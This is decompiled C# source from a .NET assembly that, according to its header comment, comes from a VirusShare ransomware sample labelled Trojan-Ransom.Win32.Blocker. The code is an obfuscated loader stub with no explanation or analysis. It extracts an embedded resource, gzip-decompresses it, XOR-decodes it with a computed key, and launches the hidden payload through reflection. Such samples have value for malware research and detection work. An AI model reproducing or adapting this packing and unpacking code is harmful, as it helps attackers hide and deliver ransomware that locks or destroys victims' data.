// Decompiled with JetBrains decompiler
// Type: ___codefort.

// Assembly: l, Version=9.7.4712.31341, Culture=neutral, PublicKeyToken=null
// MVID: 54E09185-39E1-4364-8A8C-3E5AA9242180
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00032-msil\Trojan-Ransom.Win32.Blocker.hdty-d2d2438908f517893fad04ef28c00af245015bf6f5b7b5ed70f3464ce0b2f158.exe.exe

using System;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Runtime.InteropServices;

namespace ___codefort
{
  internal static class \u000A\u0008
  {
    public static Type \u0002\u000A\u0009 { get; [param: In] private set; }

    public static object \u0002\u000A\u0013 { get; [param: In] private set; }

    public static void \u0002\u0012\u0005() => \u0002\u0004\u0006.\u0004\u0017\u0015((object) \u0002\u0004\u0003.\u0004\u0017\u0013((object) \u000A\u0008.\u0002\u000A\u0009, \u0017\u0013.\u0003\u0009\u000A("mJQ"), \u0002\u0004\u0003.\u0002\u0001\u0001\u0001\u0002\u0002\u0017), \u000A\u0008.\u0002\u000A\u0013, (object[]) null, \u0002\u0004\u0006.\u0002\u0001\u0001\u0001\u0002\u0003\u0001);

    public static void \u0002\u0012\u0008([In] string[] obj0)
    {
      Assembly assembly = \u0002\u0004\u0005.\u0004\u0017\u0017(\u0002\u0004\u0005.\u0002\u0003\u0002);
      Stream stream = \u0002\u0004\u0008.\u0004\u0017\u0002((object) assembly, \u0017\u0013.\u0003\u0009\u000A("`"), \u0002\u0004\u0008.\u0002\u0001\u0001\u0001\u0002\u0003\u0003);
      \u0017\u000A obj;
      byte[] numArray1;
      try
      {
        MemoryStream memoryStream1 = \u0002\u0004\u0007.\u0004\u0017\u0004(\u000A\u0008.\u0002\u0012\u0007(stream), \u0002\u0004\u0007.\u0003\u0001\u0001\u0001\u0002\u0003\u0004);
        try
        {
          BinaryReader binaryReader = \u0002\u0003\u000A.\u0004\u0017\u0006((Stream) memoryStream1, \u0002\u0003\u000A.\u0003\u0001\u0001\u0001\u0002\u0003\u0005);
          try
          {
            int num1 = \u0016\u0009.\u0004\u0001\u0007((object) binaryReader, \u0016\u0009.\u0002\u0001\u0001\u0001\u0001\u0015\u0007);
            byte[] numArray2 = \u0002\u0003\u0009.\u0004\u0017\u0008((object) binaryReader, num1, \u0002\u0003\u0009.\u0002\u0001\u0001\u0001\u0002\u0003\u0006);
            byte num2 = (byte) \u0002\u0003\u0013.\u0004\u0016\u0009(\u0002\u0003\u0013.\u0004\u0016\u0009(0.8, \u0002\u0003\u0013.\u0002\u0003\u0007) * (double) byte.MaxValue, \u0002\u0003\u0013.\u0002\u0003\u0008);
            for (int index = 0; index < num1; ++index)
              numArray2[index] ^= num2;
            MemoryStream memoryStream2 = \u0002\u0004\u0007.\u0004\u0017\u0004(numArray2, \u0002\u0004\u0007.\u0003\u0001\u0001\u0001\u0002\u0003\u0004);
            try
            {
              obj = new \u0017\u000A((Stream) memoryStream2);
            }
            finally
            {
              if (memoryStream2 != null)
                \u0016\u0017.\u0004\u0007\u000A((object) memoryStream2, \u0016\u0017.\u0002\u0001\u0001\u0001\u0001\u0015\u0013);
            }
            numArray1 = \u0002\u0003\u0009.\u0004\u0017\u0008((object) binaryReader, (int) (\u0002\u0003\u0015.\u0004\u0016\u0017((object) \u0002\u0003\u0012.\u0004\u0016\u0012((object) binaryReader, \u0002\u0003\u0012.\u0002\u0001\u0001\u0001\u0002\u0003\u0009), \u0002\u0003\u0015.\u0002\u0001\u0001\u0001\u0002\u0003\u000A) - \u0002\u0003\u0015.\u0004\u0016\u0017((object) \u0002\u0003\u0012.\u0004\u0016\u0012((object) binaryReader, \u0002\u0003\u0012.\u0002\u0001\u0001\u0001\u0002\u0003\u0009), \u0002\u0003\u0015.\u0002\u0001\u0001\u0001\u0002\u0003\u0012)), \u0002\u0003\u0009.\u0002\u0001\u0001\u0001\u0002\u0003\u0006);
          }
          finally
          {
            if (binaryReader != null)
              \u0016\u0017.\u0004\u0007\u000A((object) binaryReader, \u0016\u0017.\u0002\u0001\u0001\u0001\u0001\u0015\u0013);
          }
        }
        finally
        {
          if (memoryStream1 != null)
            \u0016\u0017.\u0004\u0007\u000A((object) memoryStream1, \u0016\u0017.\u0002\u0001\u0001\u0001\u0001\u0015\u0013);
        }
      }
      finally
      {
        if (stream != null)
          \u0016\u0017.\u0004\u0007\u000A((object) stream, \u0016\u0017.\u0002\u0001\u0001\u0001\u0001\u0015\u0013);
      }
      obj.\u0003\u0012\u0001(\u0017\u0013.\u0003\u0009\u000A("VROS"));
      \u000A\u0008.\u0002\u000A\u0009 = obj.\u0003\u0012\u0003(\u0017\u0013.\u0003\u0009\u000A("}PPKLKM^O{FQvROS"));
      // ISSUE: type reference
      // ISSUE: type reference
      // ISSUE: type reference
      \u000A\u0008.\u0002\u000A\u0013 = \u0002\u0003\u0017.\u0004\u0016\u0004((object) \u0002\u0003\u0014.\u0004\u0016\u0002((object) \u000A\u0008.\u0002\u000A\u0009, new Type[3]
      {
        \u0017\u0015.\u0004\u0002\u0012(__typeref (Assembly), \u0017\u0015.\u0014\u0008),
        \u0017\u0015.\u0004\u0002\u0012(__typeref (byte[]), \u0017\u0015.\u0014\u0008),
        \u0017\u0015.\u0004\u0002\u0012(__typeref (string[]), \u0017\u0015.\u0014\u0008)
      }, \u0002\u0003\u0014.\u0002\u0001\u0001\u0001\u0002\u0003\u0013), new object[3]
      {
        (object) assembly,
        (object) numArray1,
        (object) obj0
      }, \u0002\u0003\u0017.\u0002\u0001\u0001\u0001\u0002\u0003\u0014);
    }

    private static byte[] \u0002\u0012\u0007([In] Stream obj0)
    {
      byte[] numArray = (byte[]) null;
      BinaryReader binaryReader = \u0002\u0003\u000A.\u0004\u0017\u0006(obj0, \u0002\u0003\u000A.\u0003\u0001\u0001\u0001\u0002\u0003\u0005);
      try
      {
        int length = \u0016\u0009.\u0004\u0001\u0007((object) binaryReader, \u0016\u0009.\u0002\u0001\u0001\u0001\u0001\u0015\u0007);
        numArray = new byte[length];
        GZipStream gzipStream = \u0002\u0003\u0016.\u0004\u0016\u0006(obj0, CompressionMode.Decompress, \u0002\u0003\u0016.\u0003\u0001\u0001\u0001\u0002\u0003\u0015);
        \u0002\u0003\u0002.\u0004\u0016\u0008((object) gzipStream, numArray, 0, length, \u0002\u0003\u0002.\u0002\u0001\u0001\u0001\u0002\u0003\u0016);
        \u0016\u0017.\u0004\u0007\u000A((object) gzipStream, \u0016\u0017.\u0002\u0001\u0001\u0001\u0001\u0016\u0003);
      }
      finally
      {
        if (binaryReader != null)
          \u0016\u0017.\u0004\u0007\u000A((object) binaryReader, \u0016\u0017.\u0002\u0001\u0001\u0001\u0001\u0015\u0013);
      }
      return numArray;
    }

    private static void \u0002\u000A\u000A([In] Stream obj0, [In] Stream obj1)
    {
      byte[] numArray = new byte[4096];
      int num;
      while ((num = \u0002\u0003\u0002.\u0004\u0016\u0008((object) obj0, numArray, 0, numArray.Length, \u0002\u0003\u0002.\u0002\u0001\u0001\u0001\u0002\u0003\u0016)) != 0)
        \u0002\u0003\u0001.\u0004\u0015\u000A((object) obj1, numArray, 0, num, \u0002\u0003\u0001.\u0002\u0001\u0001\u0001\u0002\u0003\u0017);
    }
  }
}
